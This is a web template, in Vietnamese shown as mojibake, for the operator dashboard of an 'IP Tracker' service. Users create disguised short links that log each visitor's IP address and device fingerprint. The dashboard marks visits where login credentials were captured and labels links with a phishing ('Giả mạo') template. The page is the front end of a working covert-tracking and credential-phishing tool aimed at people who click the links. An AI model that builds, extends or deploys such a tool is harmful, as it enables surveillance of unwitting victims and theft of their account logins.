<%- include('partials/header_vietnamese') %>

<nav>
  <ul><li><strong>IP Tracker</strong> by Gemlogin Tool (TuanHaii)</li></ul>
  <ul>
    <li><a href="/key" role="button" class="contrast">Qu·∫£n l√Ω Key</a></li>
    <li><details role="list" dir="rtl"><summary aria-haspopup="listbox" role="link"><img src="<%= user.avatar %>" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; vertical-align: middle;"> <%= user.username %></summary><ul role="listbox"><li><a href="/auth/logout">ƒêƒÉng xu·∫•t</a></li></ul></details></li>
  </ul>
</nav>

<!-- V√ôNG TH√îNG B√ÅO Tƒ®NH ƒê√É B·ªä X√ìA -->
<% if (!hasActiveKey) { %>
    <article class="custom-warning">
        Key c·ªßa b·∫°n ch∆∞a ƒë∆∞·ª£c k√≠ch ho·∫°t ho·∫∑c ƒë√£ h·∫øt h·∫°n. Vui l√≤ng v√†o trang <b>Qu·∫£n l√Ω Key</b> ƒë·ªÉ c√°c t√≠nh nƒÉng ƒë∆∞·ª£c m·ªü kh√≥a.
    </article>
<% } %>

<style>.custom-warning { border-left: 5px solid var(--pico-color-amber-500); padding: 0.1rem 1.5rem; } </style>

<fieldset <%= !hasActiveKey ? 'disabled' : '' %> >
  <hgroup><h2>T·∫°o li√™n k·∫øt theo d√µi m·ªõi</h2><p>Gi·∫£i Captcha ƒë·ªÉ k√≠ch ho·∫°t n√∫t "T·∫°o li√™n k·∫øt".</p></hgroup>
  <form action="/create-link" method="POST"><input type="url" name="targetUrl" placeholder="https://url-dich-cua-ban.com" required><div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onLinkCaptchaSuccess" data-expired-callback="onLinkCaptchaExpired"></div><button id="create-link-btn" type="submit" disabled>T·∫°o li√™n k·∫øt</button></form>
</fieldset>
<hr>

<h2>Li√™n k·∫øt & K·∫øt qu·∫£ c·ªßa b·∫°n</h2>
<small><em>C√°c li√™n k·∫øt kh√¥ng c√≥ l∆∞·ª£t truy c·∫≠p trong 2 ng√†y s·∫Ω t·ª± ƒë·ªông b·ªã x√≥a.</em></small>

<% if (links.length === 0) { %><p style="margin-top: 1rem;">B·∫°n ch∆∞a t·∫°o li√™n k·∫øt n√†o.</p><% } else { %>
    <% links.forEach(link => { %>
        <article>
            <header style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                <div><strong>Li√™n k·∫øt:</strong> <code style="cursor: pointer;" onclick="copyAndNotify('<%= baseUrl %>/t/<%= link.shortId %>')"><%= baseUrl %>/t/<%= link.shortId %></code></div>
                <div style="display:flex; gap: 0.5rem;">
                    <a href="/link/settings/<%= link.shortId %>" role="button" class="contrast" style="padding: 5px 10px; margin: 0; white-space: nowrap;">C√†i ƒë·∫∑t</a>
                    <form action="/delete-link/<%= link.shortId %>" method="POST" onsubmit="return confirm('B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a li√™n k·∫øt n√†y v√† t·∫•t c·∫£ k·∫øt qu·∫£ kh√¥ng?');" style="margin:0;"><button type="submit" class="secondary outline" style="padding: 5px 10px; margin: 0; white-space: nowrap;">X√≥a</button></form>
                </div>
            </header>
            <p style="overflow-wrap: break-word; margin-bottom: 0.5rem;"><strong>ƒê√≠ch:</strong> <a href="<%= link.targetUrl %>" target="_blank" rel="noopener noreferrer"><%= link.targetUrl %></a></p>
            <% if (link.phishTemplate) { %><small><strong style="color:var(--pico-color-red-400)">‚ö†Ô∏è Gi·∫£ m·∫°o: <%= link.phishTemplate %></strong></small><% } %>
            <% if (link.Visits && link.Visits.length > 0) { %>
                <div class="overflow-auto" style="margin-top: 1rem;">
                    <table>
                        <thead><tr><th>ID Thi·∫øt b·ªã</th><th>ƒê·ªãa ch·ªâ IP</th><th>Th·ªùi gian</th><th style="text-align: right;">H√†nh ƒë·ªông</th></tr></thead>
                        <tbody>
                            <% link.Visits.forEach(visit => { %>
                                <tr id="visit-row-<%= visit.id %>">
                                    <td><code><%= visit.fingerprintId %></code> <% if(visit.Credential) { %> <span title="C√≥ th√¥ng tin ƒëƒÉng nh·∫≠p">üîí</span> <% } %></td>
                                    <td><%= visit.ipAddress %></td>
                                    <td><%= new Date(visit.timestamp).toLocaleString('vi-VN') %></td>
                                    <td style="text-align: right; white-space: nowrap;">
                                        <a href="<%= hasActiveKey ? '/details/' + visit.id : '#' %>" role="button" class="contrast" <%= !hasActiveKey ? 'aria-disabled="true"' : '' %> onclick="<%= !hasActiveKey ? "showSwalToast('Vui l√≤ng k√≠ch ho·∫°t Key ƒë·ªÉ xem chi ti·∫øt.', 'warning'); return false;" : "" %>" style="padding: 5px 10px; margin:0 5px 0 0;">Chi ti·∫øt</a>
                                        <a href="#" role="button" class="secondary" style="padding: 5px 10px; margin:0;" onclick="deleteVisit(event, '<%= visit.id %>')">X√≥a</a>
                                    </td>
                                </tr>
                            <% }) %>
                        </tbody>
                    </table>
                </div>
            <% } else { %> <p style="margin-top: 1rem;"><em>Ch∆∞a c√≥ l∆∞·ª£t truy c·∫≠p.</em></p> <% } %>
        </article>
    <% }) %>
<% } %>

<%- include('partials/footer_vietnamese') %>

<script>
    // --- KHAI B√ÅO BI·∫æN STATUS T·ª™ SERVER ---
    const pageStatus = <%- JSON.stringify(status || null) %>;

    // --- LOGIC CAPTCHA ---
    const createLinkBtn = document.getElementById('create-link-btn');
    function onLinkCaptchaSuccess(token) { if(createLinkBtn) createLinkBtn.disabled = false; }
    function onLinkCaptchaExpired() { if(createLinkBtn) createLinkBtn.disabled = true; }

    // --- LOGIC H√ÄNH ƒê·ªòNG C·ª¶A TRANG ---
    function copyAndNotify(text){
        navigator.clipboard.writeText(text).then(() => {
            showSwalToast('ƒê√£ sao ch√©p v√†o b·ªô nh·ªõ t·∫°m!');
        }).catch(err => {
            showSwalToast('Sao ch√©p th·∫•t b·∫°i!', 'error');
        });
    }

    async function deleteVisit(event, visitId) {
        event.preventDefault();

        const result = await Swal.fire({
            title: 'B·∫°n c√≥ ch·∫Øc ch·∫Øn?',
            text: "B·∫°n s·∫Ω kh√¥ng th·ªÉ ho√†n t√°c h√†nh ƒë·ªông n√†y!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'V√¢ng, x√≥a n√≥!',
            cancelButtonText: 'H·ªßy b·ªè',
            customClass: { popup: 'swal2-dark' }
        });

        if (!result.isConfirmed) return;

        try {
            const response = await fetch(`/delete-visit/${visitId}`, { method: 'POST' });
            const data = await response.json();
            if (data.success) {
                document.getElementById(`visit-row-${visitId}`)?.remove();
                showSwalToast('ƒê√£ x√≥a k·∫øt qu·∫£ th√†nh c√¥ng.', 'success');
            } else {
                showSwalToast(data.message || 'Kh√¥ng th·ªÉ x√≥a k·∫øt qu·∫£.', 'error');
            }
        } catch (error) {
            showSwalToast('ƒê√£ x·∫£y ra l·ªói khi x√≥a k·∫øt qu·∫£.', 'error');
        }
    }
    
    // --- HI·ªÇN TH·ªä TH√îNG B√ÅO KHI TRANG T·∫¢I ---
    document.addEventListener('DOMContentLoaded', () => {
        if (!pageStatus) return;

        const messages = {
            link_created: { title: 'T·∫°o li√™n k·∫øt th√†nh c√¥ng!', icon: 'success' },
            settings_saved: { title: 'ƒê√£ l∆∞u c√†i ƒë·∫∑t!', icon: 'success' },
            link_deleted: { title: 'ƒê√£ x√≥a li√™n k·∫øt.', icon: 'info' },
            captcha_error: { title: 'L·ªói Captcha', text: 'X√°c th·ª±c kh√¥ng th√†nh c√¥ng, vui l√≤ng th·ª≠ l·∫°i.', icon: 'error' },
            invalid_url: { title: 'URL kh√¥ng h·ª£p l·ªá', text: 'Vui l√≤ng nh·∫≠p m·ªôt URL h·ª£p l·ªá.', icon: 'error' }
        };

        const message = messages[pageStatus];
        if (message) {
            Swal.fire({
                ...message,
                toast: true,
                position: 'top-end',
                showConfirmButton: false,
                timer: 3500,
                timerProgressBar: true,
                customClass: { popup: 'swal2-dark' }
            });
        }
    });
</script>
